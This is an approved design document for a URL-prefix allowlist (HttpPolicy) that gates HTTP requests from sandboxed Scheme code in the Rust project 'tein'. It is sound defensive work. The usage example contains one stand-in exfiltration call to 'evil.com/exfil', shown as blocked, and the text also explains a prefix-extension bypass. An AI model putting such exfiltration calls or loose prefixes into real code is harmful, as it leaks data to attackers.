# HttpPolicy: URL-prefix allowlist for sandboxed HTTP access

**Date**: 2026-03-16
**Status**: Approved

## Problem

`(tein http)` is `default_safe: false` — entirely unavailable in sandboxed contexts. Embedders building REST API wrapper modules need sandboxed code to make HTTP requests to specific endpoints without granting unrestricted internet access.

## Design

A URL-prefix allowlist gating `(tein http)` in sandboxed contexts, following the `FsPolicy` pattern.

### Data structure

```rust
// sandbox.rs
pub struct HttpPolicy {
    url_prefixes: Vec<String>,
}

impl HttpPolicy {
    pub fn new(prefixes: Vec<String>) -> Self { ... }

    /// Returns true if `url` starts with any allowed prefix.
    pub fn check_url(&self, url: &str) -> bool {
        self.url_prefixes.iter().any(|p| url.starts_with(p))
    }
}
```

Exact prefix matching. No URL normalization beyond what ureq already does. The embedder controls trailing slashes, scheme, etc. **Important**: embedders should use trailing slashes on path prefixes to avoid prefix-extension attacks — `"https://api.example.com/v1/"` is safe, but `"https://api.example.com/v1"` would also match `"https://api.example.com/v1-evil/exfil"`.

### Thread-local state

```rust
// sandbox.rs, alongside FS_POLICY
thread_local! {
    pub(crate) static HTTP_POLICY: RefCell<Option<HttpPolicy>> = RefCell::new(None);
}
```

No separate gate u8. The VFS allowlist prevents `(import (tein http))` when no policy is set. `None` in sandboxed code is defense-in-depth only.

### Builder API

```rust
// context.rs, on ContextBuilder
pub fn http_allow(mut self, prefixes: &[&str]) -> Self
```

Stores prefixes as `http_prefixes: Option<Vec<String>>` on `ContextBuilder`. The method also calls `self.allow_module("tein/http")` (following the `allow_dynamic_modules` pattern), which handles VFS allowlist addition and transitive dep resolution. If no explicit `.sandboxed()` call is present, `http_allow` auto-activates `sandboxed(Modules::Safe)`, matching `file_read`/`file_write` behavior.

During `build()`:
1. If `http_prefixes` is `Some`, saves previous `HTTP_POLICY` thread-local value (at the same point as `prev_fs_policy`), then sets `HTTP_POLICY` with the new `HttpPolicy`.
2. Module allowlist already handled at builder method time via `allow_module`.

`Context` struct gets a `prev_http_policy: Option<HttpPolicy>` field, initialized to `None` by default.

### Trampoline enforcement

In `http.rs`, at the top of `do_http_request`, before the ureq call:

1. `!IS_SANDBOXED` → allow (unchanged behavior for unsandboxed contexts).
2. `IS_SANDBOXED` + `HTTP_POLICY` is `Some(policy)` → `policy.check_url(url)`:
   - Pass → proceed with request.
   - Fail → raise scheme exception: `"http request blocked: URL not in allowlist: {url}"`.
3. `IS_SANDBOXED` + `HTTP_POLICY` is `None` → deny (defense-in-depth, unreachable in practice).

### RAII cleanup

`Context` stores `prev_http_policy: Option<HttpPolicy>`. On `drop()`, restores the `HTTP_POLICY` thread-local to its previous value. Same pattern as `prev_fs_policy`.

### What doesn't change

- Unsandboxed contexts: no behavior change. `HTTP_POLICY` is not consulted.
- `tein/http` VFS registry entry stays `default_safe: false`.
- The http trampoline signature, `do_http_request` internals, ureq call, response alist building — all unchanged. The check is a prefix guard.

## Decisions

| Decision | Choice | Rationale |
|----------|--------|-----------|
| Allowlist granularity | URL prefixes only | Method-level gating adds complexity the embedder can enforce at the scheme wrapper level. YAGNI. |
| Auto-enable module | Yes, `http_allow` calls `allow_module("tein/http")` | Intent is unambiguous; two-knob design invites misconfiguration. Follows `allow_dynamic_modules` pattern. |
| Auto-activate sandbox | Yes, `http_allow` without explicit `sandboxed()` activates `Modules::Safe` | Matches `file_read`/`file_write` behavior. HTTP policy is meaningless without a sandbox. |
| Empty prefixes | Intentional: `http_allow(&[])` enables import but blocks all requests | Allows scheme code to define error-handling paths; consistent with empty `FsPolicy` prefix lists. |
| Error transparency | Clear policy error with URL | Sandboxed code already knows it's sandboxed. Matches filesystem error style. |
| Separate gate u8 | No | VFS allowlist already prevents import; `Option<HttpPolicy>` suffices. |

## Usage example

```rust
let ctx = Context::builder()
    .standard_env()
    .sandboxed(Modules::Safe)
    .http_allow(&["https://api.example.com/v1/"])
    .build()?;

// Sandboxed scheme code can now:
//   (import (tein http))
//   (http-get "https://api.example.com/v1/users")  ; allowed
//   (http-get "https://evil.com/exfil")             ; blocked with exception
```

## Testing

- **Allowed URL**: sandboxed context with `http_allow(&["https://httpbin.org/"])`, `http-get` to allowed prefix succeeds.
- **Blocked URL**: same context, request to a URL outside the allowlist raises exception with expected message.
- **No policy**: sandboxed context without `http_allow`, `(import (tein http))` fails (VFS gate blocks it).
- **Unsandboxed**: no behavior change, requests go through without checks.
- **RAII restoration**: sequential contexts on the same thread don't leak policy state.
- **Empty allowlist**: `http_allow(&[])` enables the module but blocks all requests.

## Files to modify

- `tein/src/sandbox.rs` — `HttpPolicy` struct, `HTTP_POLICY` thread-local.
- `tein/src/context.rs` — `http_allow` builder method, wiring in `build()`, RAII field + `drop()` restoration.
- `tein/src/http.rs` — policy check at top of `do_http_request`.
- `tein/src/lib.rs` — re-export `HttpPolicy` if needed for public API.
- `tein/AGENTS.md` — document the new policy flow.
- `docs/sandboxing.md` — document builder API and usage.
- `docs/reference.md` — update `tein/http` entry.
